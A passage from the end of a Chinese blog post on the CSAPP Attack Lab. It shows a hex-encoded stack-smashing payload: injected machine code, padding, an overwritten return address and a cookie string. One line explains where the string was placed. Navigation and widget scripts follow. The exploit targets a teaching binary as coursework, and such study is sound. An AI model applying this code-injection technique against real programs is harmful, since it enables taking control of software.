+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 C7 C7 A8 DC 61 55 68</span><br><span class="line">FA 18 40 00 C3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 DC 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>直接把攻击字符串放在地址最高的地方，然后就通过了。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://adguycn990.github.io">adguy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://adguycn990.github.io/adguy/5c165311.html">https://adguycn990.github.io/adguy/5c165311.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">此文章版权归金晖の博客所有，如有转载，请注明来自原作者</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/csapp/">csapp</a><a class="post-meta__tags" href="/tags/attacklab/">attacklab</a></div><div class="post_share"><div class="social-share" data-image="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044233.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/adguy/4aaac914.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241043462.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">拓扑排序-下</div></div></a></div><div class="next-post pull-right"><a href="/adguy/7991beee.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044242.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">boomlab-6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/adguy/aeaca493.html" title="attacklab-rtarget（未完成）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241043218.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">attacklab-rtarget（未完成）</div></div></a></div><div><a href="/adguy/278f748a.html" title="boomlab [1-5]"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241043381.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-22</div><div class="title">boomlab [1-5]</div></div></a></div><div><a href="/adguy/7991beee.html" title="boomlab-6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044242.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-22</div><div class="title">boomlab-6</div></div></a></div><div><a href="/adguy/3062d5c8.html" title="datalab"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211241044233.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-22</div><div class="title">datalab</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text"> 实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E6%88%91%E6%B5%8B%E8%AF%84"><span class="toc-number">3.</span> <span class="toc-text"> 自我测评</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hex2raw"><span class="toc-number">4.</span> <span class="toc-text"> 使用HEX2RAW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text"> 生成机器码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leval1"><span class="toc-number">6.</span> <span class="toc-text"> Leval1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leval2"><span class="toc-number">7.</span> <span class="toc-text"> Leval2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leval3"><span class="toc-number">8.</span> <span class="toc-text"> Leval3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E8%BD%AC%E5%8C%96"><span class="toc-number">8.1.</span> <span class="toc-text"> 数字转化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="toc-number">8.2.</span> <span class="toc-text"> 栈帧结构</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232358703.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> ADguy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://my-twikoo-sepia.vercel.app/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://my-twikoo-sepia.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>window.$crisp = [];
+window.CRISP_WEBSITE_ID = "91d09d92-e301-46a9-99dd-29249549cd5b";
+(function () {
+  d = document;
+  s = d.createElement("script");
+  s.src = "https://client.crisp.chat/l.js";
+  s.async = 1;
+  d.getElementsByTagName("head")[0].appendChild(s);
+})();
+$crisp.push(["safe", true])
+
+if (true) {
+  $crisp.push(["do", "chat:hide"])
+  $crisp.push(["on", "chat:closed", function() {
+    $crisp.push(["do", "chat:hide"])
+  }])
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      $crisp.push(["do", "chat:show"])
+      $crisp.push(["do", "chat:open"])
+
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      $crisp.push(["do", "chat:hide"])
+    }
+    function chatBtnShow () {
+      $crisp.push(["do", "chat:show"])
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 380px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 320px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308153.webp);"> <a class="categoryBar-list-link" href="categories/大学作业/">大学作业</a><span class="categoryBar-list-count">29</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211242052207.webp);"> <a class="categoryBar-list-link" href="categories/工程/">工程</a><span class="categoryBar-list-count">23</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308875.webp);"> <a class="categoryBar-list-link" href="categories/大学作业/C/">C++</a><span class="categoryBar-list-count">26</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308493.webp);"> <a class="categoryBar-list-link" href="categories/工程/web前端/">web前端</a><span class="categoryBar-list-count">7</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308530.webp);"> <a class="categoryBar-list-link" href="categories/工程/Springboot/">Springboot</a><span class="categoryBar-list-count">14</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211242101358.webp);"> <a class="categoryBar-list-link" href="categories/csapp/">csapp</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308153.webp);"> <a class="categoryBar-list-link" href="categories/acm/">acm</a><span class="categoryBar-list-count">15</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211242052207.webp);"> <a class="categoryBar-list-link" href="categories/大学作业/人工智能/">人工智能</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308875.webp);"> <a class="categoryBar-list-link" href="categories/工程/Springboot/kob/">kob</a><span class="categoryBar-list-count">14</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308493.webp);"> <a class="categoryBar-list-link" href="categories/acm/题解/">题解</a><span class="categoryBar-list-count">3</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232308530.webp);"> <a class="categoryBar-list-link" href="categories/acm/算法/">算法</a><span class="categoryBar-list-count">14</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '5f4f6e4127424bb58cb4453d5dc53e66';
+  var gaud_map_key = '86560bbf74c1ecb5465e430c47d52986';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '120.36903598826007,30.327400983734716';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":150,"height":360,"hOffset":20,"vOffset":-20},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
